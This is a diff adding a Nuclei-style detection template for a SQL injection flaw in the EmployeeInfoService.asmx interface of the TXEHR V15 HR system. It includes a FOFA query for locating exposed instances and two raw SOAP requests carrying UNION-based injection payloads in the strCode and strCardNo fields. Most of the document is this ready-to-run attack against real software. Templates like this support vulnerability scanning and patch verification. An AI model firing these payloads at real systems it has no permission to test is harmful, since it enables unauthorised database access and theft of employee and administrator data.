@@ -1,0 +1,60 @@
+id: tongxiangHR-TXEHR_V15_EmployeeInfoService-sql
+
+info:
+  name: "TXEHR V15 EmployeeInfoService.asmx 接口存在SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+      同享人力资源管理系统-TXEHR V15版本的EmployeeInfoService.asmx接口存在多处SQL注入安全缺陷。攻击者可通过构造恶意请求注入任意SQL语句，实现数据库敏感信息窃取（如管理员凭证、用户隐私数据）及服务端代码执行。在具备足够权限条件下，该缺陷可能被用于部署恶意负载或实现对目标系统的持久化控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140987379
+  tags: 同享人力资源管理系统
+
+
+
+http:
+- raw:
+  - |
+    POST /Service/EmployeeInfoService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetEmployeeByCode"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+     <soap:Body>
+      <GetEmployeeByCode xmlns="http://tempuri.org/">
+       <strCode>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCode>
+      </GetEmployeeByCode>
+     </soap:Body>
+    </soap:Envelope>
+  - |
+    POST /Service/EmployeeInfoService.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://tempuri.org/GetEmployeeByCardNo"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+     <soap:Body>
+      <GetEmployeeByCardNo xmlns="http://tempuri.org/">
+       <strCardNo>1' UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</strCardNo>
+      </GetEmployeeByCardNo>
+     </soap:Body>
+    </soap:Envelope>
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Microsoft SQL'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
